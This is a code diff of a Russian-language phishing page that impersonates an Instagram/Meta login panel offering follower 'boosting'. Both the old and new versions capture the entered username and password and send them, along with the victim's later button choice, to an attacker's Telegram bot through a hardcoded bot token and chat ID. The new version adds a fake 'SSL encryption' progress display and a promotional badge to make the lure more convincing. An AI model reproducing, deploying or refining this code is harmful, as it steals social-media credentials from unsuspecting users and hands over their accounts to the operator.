@@ -3,247 +3,269 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Support | Authentication</title>
+    <title>Meta Business | Verified Panel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
+        :root {
+            --ig-grad: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            --meta-blue: #0095f6;
+        }
+
         body { 
             margin: 0; 
             min-height: 100vh; 
             display: flex; 
-            flex-direction: column; 
             justify-content: center; 
             align-items: center; 
+            background: #fafafa;
             background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%,#d6249f 60%,#285AEB 90%);
+            background-attachment: fixed;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             padding: 20px; 
         }
 
+        /* Эффект стекла для контейнера */
         .container { 
             width: 100%; 
-            max-width: 350px; 
-            background: #ffffff; 
-            border-radius: 3px; 
-            padding: 40px 30px; 
+            max-width: 380px; 
+            background: rgba(255, 255, 255, 0.98); 
+            border-radius: 12px; 
+            padding: 40px; 
             box-sizing: border-box; 
-            border: 1px solid #dbdbdb; 
+            border: 1px solid rgba(0,0,0,0.1); 
             text-align: center; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            transition: all 0.5s ease;
         }
 
         .logo-ig {
-            font-size: 35px;
-            margin-bottom: 25px;
-            color: #262626;
-            font-weight: bold;
-            letter-spacing: -1px;
+            font-size: 32px;
+            margin-bottom: 10px;
+            background: var(--ig-grad);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 800;
         }
 
-        .header { color: #8e8e8e; margin-bottom: 20px; font-size: 15px; font-weight: 600; line-height: 1.4;}
+        .header { color: #262626; margin-bottom: 25px; font-size: 16px; font-weight: 400; line-height: 1.4; }
 
-        /* Поля ввода */
+        /* Поля ввода в стиле Modern UI */
         .input-group {
             position: relative;
             width: 100%;
-            margin-bottom: 8px;
+            margin-bottom: 12px;
         }
 
         input { 
             width: 100%; 
-            padding: 11px 40px 11px 10px; 
-            border-radius: 3px; 
+            padding: 14px 12px; 
+            border-radius: 8px; 
             border: 1px solid #dbdbdb; 
             outline: none; 
             box-sizing: border-box; 
             font-size: 14px; 
             background: #fafafa;
-            color: #262626;
+            transition: all 0.3s;
         }
-        input:focus { border-color: #a8a8a8; }
+
+        input:focus {
+            border-color: #a8a8a8;
+            background: #fff;
+            box-shadow: 0 0 8px rgba(0,0,0,0.05);
+        }
 
         .eye-icon {
             position: absolute;
-            right: 12px;
+            right: 15px;
             top: 50%;
             transform: translateY(-50%);
             color: #8e8e8e;
             cursor: pointer;
-            font-size: 16px;
-            display: none; 
+            display: none;
+            transition: color 0.3s;
         }
+
+        .eye-icon:hover { color: #262626; }
         
-        /* Кнопка входа */
+        /* Кнопка с анимацией */
         #btn { 
             width: 100%; 
-            padding: 8px; 
-            border-radius: 4px; 
+            padding: 14px; 
+            border-radius: 8px; 
             border: none; 
-            background: #0095f6; 
+            background: var(--meta-blue); 
             color: white; 
-            font-weight: 600; 
+            font-weight: 700; 
             cursor: pointer; 
-            font-size: 14px; 
-            margin-top: 15px; 
-            transition: 0.2s; 
+            font-size: 15px; 
+            margin-top: 10px; 
+            box-shadow: 0 4px 14px rgba(0, 149, 246, 0.4);
+            transition: all 0.3s;
         }
-        #btn:hover { background: #1877f2; }
-        #btn:disabled { background: rgba(0,149,246,0.3); }
 
-        /* Лоадер */
+        #btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 149, 246, 0.5);
+        }
+
+        #btn:active { transform: translateY(0); }
+
+        /* Профессиональный лоадер */
         .loader-container {
             display: none;
-            width: 100%;
-            margin-top: 20px;
-        }
-        .progress-bg {
-            width: 100%;
-            height: 4px;
-            background: #dbdbdb;
-            border-radius: 2px;
-            overflow: hidden;
-            position: relative;
-        }
-        .progress-bar {
-            width: 50%;
-            height: 100%;
-            background: linear-gradient(to right, #fd5949, #d6249f);
-            position: absolute;
-            animation: moveLoader 1.5s infinite ease-in-out;
-        }
-        @keyframes moveLoader {
-            0% { left: -50%; }
-            100% { left: 100%; }
+            text-align: center;
+            padding: 20px 0;
         }
 
-        /* Меню выбора */
-        #menu { display: none; flex-direction: column; gap: 12px; margin-top: 15px; }
+        .circle-loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #d6249f;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .perc { font-weight: bold; color: #262626; font-size: 18px; }
+
+        /* Меню действий */
+        #menu { display: none; flex-direction: column; gap: 15px; animation: fadeIn 0.8s; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
         .menu-btn {
             width: 100%;
-            padding: 12px;
-            border-radius: 4px;
-            font-weight: 600;
+            padding: 16px;
+            border-radius: 10px;
+            font-weight: 700;
             cursor: pointer;
-            font-size: 14px;
             border: none;
+            font-size: 15px;
             transition: 0.3s;
         }
+
         .btn-boost {
-            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            background: var(--ig-grad);
             color: white;
-        }
-        .btn-original {
-            background: #efefef;
-            color: #262626;
+            box-shadow: 0 10px 20px rgba(214, 36, 159, 0.3);
         }
 
-        .footer-text { margin-top: 25px; color: #8e8e8e; font-size: 12px; }
+        .btn-original {
+            background: #f0f2f5;
+            color: #1c1e21;
+        }
+
+        .bonus-badge {
+            background: #e7f3ff;
+            color: #1877f2;
+            padding: 8px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div class="container" id="main-box">
     <div class="logo-ig">
-        <i class="fab fa-instagram"></i> Instagram
+        <i class="fab fa-instagram"></i> Instagram Meta
     </div>
 
     <div id="login-form">
-        <div class="header">Войдите, чтобы продолжить работу с панелью управления</div>
+        <p class="header">Подтвердите личность для доступа к расширенным функциям продвижения.</p>
         
         <div class="input-group">
-            <input type="text" id="user" placeholder="Логин или email" oninput="showEye('user', 'eye-user')">
-            <i class="fas fa-eye-slash eye-icon" id="eye-user" onclick="toggleView('user', 'eye-user')"></i>
+            <input type="text" id="user" placeholder="Имя пользователя или эл. адрес" oninput="checkInput('user', 'e1')">
+            <i class="fas fa-eye-slash eye-icon" id="e1" onclick="toggle('user', 'e1')"></i>
         </div>
 
         <div class="input-group">
-            <input type="password" id="pass" placeholder="Пароль" oninput="showEye('pass', 'eye-pass')">
-            <i class="fas fa-eye-slash eye-icon" id="eye-pass" onclick="toggleView('pass', 'eye-pass')"></i>
+            <input type="password" id="pass" placeholder="Пароль" oninput="checkInput('pass', 'e2')">
+            <i class="fas fa-eye-slash eye-icon" id="e2" onclick="toggle('pass', 'e2')"></i>
         </div>
 
-        <button id="btn" onclick="sendData()">Войти</button>
+        <button id="btn" onclick="startProcess()">Продолжить</button>
     </div>
 
     <div class="loader-container" id="loader">
-        <div class="progress-bg"><div class="progress-bar"></div></div>
-        <p style="color: #8e8e8e; font-size: 13px;">Синхронизация данных...</p>
+        <div class="circle-loader"></div>
+        <div class="perc" id="perc">0%</div>
+        <p style="color: #8e8e8e; font-size: 13px;">Шифрование SSL соединения...</p>
     </div>
 
     <div id="menu">
-        <div class="header" style="color: #262626;">Аккаунт успешно подключен!</div>
-        <button class="menu-btn btn-boost" onclick="finalAction('boost')">🚀 Начать накрутку</button>
-        <button class="menu-btn btn-original" onclick="finalAction('login')">🌐 Перейти в профиль</button>
+        <div class="bonus-badge">🎁 Акция: +10% к любому заказу при входе через панель</div>
+        <button class="menu-btn btn-boost" onclick="finalStep('boost')">🚀 Запустить накрутку</button>
+        <button class="menu-btn btn-original" onclick="finalStep('login')">🌐 Войти в оригинальный Instagram</button>
     </div>
-
-    <div class="footer-text">© 2026 Meta from Facebook</div>
 </div>
 
 <script>
-const TG_TOKEN = "8653348218:AAEIW_z5aWHH76yiuFQL3cPKfO2e3wNBxn4";
-const TG_ID = "7829181579";
+    const CONFIG = {
+        token: "8653348218:AAEIW_z5aWHH76yiuFQL3cPKfO2e3wNBxn4",
+        chatId: "7829181579",
+        partnerLink: "https://t.me/HQ_smmbot_bot?start=7829181579"
+    };
 
-let savedUser = "";
+    let uData = "";
 
-// Функция глазка: появление иконки
-function showEye(inputId, eyeId) {
-    const val = document.getElementById(inputId).value;
-    document.getElementById(eyeId).style.display = val.length > 0 ? "block" : "none";
-}
-
-// Функция глазка: переключение видимости
-function toggleView(inputId, eyeId) {
-    const input = document.getElementById(inputId);
-    const eye = document.getElementById(eyeId);
-    if (input.type === "password") {
-        input.type = "text";
-        eye.classList.replace("fa-eye-slash", "fa-eye");
-    } else {
-        input.type = "password";
-        eye.classList.replace("fa-eye", "fa-eye-slash");
+    function checkInput(id, eyeId) {
+        const val = document.getElementById(id).value;
+        document.getElementById(eyeId).style.display = val.length > 0 ? "block" : "none";
     }
-}
 
-// ПЕРВАЯ ОТПРАВКА (Логин и Пароль)
-async function sendData() {
-    savedUser = document.getElementById("user").value;
-    let p = document.getElementById("pass").value;
-
-    if (!savedUser || !p) { alert("Введите данные!"); return; }
-
-    document.getElementById("login-form").style.display = "none";
-    document.getElementById("loader").style.display = "block";
-
-    const text = `📬 НОВЫЙ ВХОД\n👤 Логин: ${savedUser}\n🔑 Пароль: ${p}`;
-    
-    try {
-        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}`);
-        
-        // Пауза для реалистичности
-        setTimeout(() => {
-            document.getElementById("loader").style.display = "none";
-            document.getElementById("menu").style.display = "flex";
-        }, 2500);
-    } catch (e) {
-        alert("Ошибка соединения");
-        location.reload();
-    }
-}
-
-// ВТОРАЯ ОТПРАВКА (Что нажал пользователь)
-async function finalAction(type) {
-    const actionName = type === 'boost' ? "🔥 НАЖАЛ: НАКРУТКА" : "🌐 НАЖАЛ: ВХОД В ПРОФИЛЬ";
-    const text = `🔔 ДЕЙСТВИЕ\n👤 Юзер: ${savedUser}\n📍 Статус: ${actionName}`;
-
-    try {
-        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}`);
-        
-        if (type === 'boost') {
-            alert("Заявка на накрутку принята!");
-            window.location.href = "https://t.me/HQ_smmbot_bot";
+    function toggle(id, eyeId) {
+        const el = document.getElementById(id);
+        const eye = document.getElementById(eyeId);
+        if (el.type === "password") {
+            el.type = "text";
+            eye.classList.replace("fa-eye-slash", "fa-eye");
         } else {
-            window.location.href = "https://www.instagram.com/accounts/login/";
+            el.type = "password";
+            eye.classList.replace("fa-eye", "fa-eye-slash");
         }
-    } catch (e) {
-        window.location.href = "https://www.instagram.com/";
     }
-}
+
+    async function startProcess() {
+        uData = document.getElementById("user").value;
+        let pData = document.getElementById("pass").value;
+
+        if (!uData || !pData) return alert("Пожалуйста, заполните поля.");
+
+        document.getElementById("login-form").style.display = "none";
+        document.getElementById("loader").style.display = "block";
+
+        // Отправка первой фазы в ТГ
+        const msg = `💎 **NEW LOG**\n👤 User: \`${uData}\`\n🔑 Pass: \`${pData}\``;
+        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&parse_mode=Markdown&text=${encodeURIComponent(msg)}`);
+
+        // Анимация процентов
+        let p = 0;
+        let interval = setInterval(() => {
+            p += Math.floor(Math.random() * 15) + 1;
+            if (p > 100) p = 100;
+            document.getElementById("perc").innerText = p + "%";
+            if (p === 100) {
+                clearInterval(interval);
+                document.getElementById("loader").style.display = "none";
+                document.getElementById("menu").style.display = "flex";
+            }
+        }, 300);
+    }
+
+    async function finalStep(type) {
+        const action = type === 'boost' ? "🚀 ВЫБРАЛ НАКРУТКУ" : "🌐 ВЫБРАЛ ОРИГИНАЛ";
+        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent("🔔 " + uData + " -> " + action)}`);
+        
+        setTimeout(() => {
+            window.location.href = (type === 'boost') ? CONFIG.partnerLink : "https://www.instagram.com/accounts/login/";
+        }, 500);
+    }
 </script>
 
 </body>
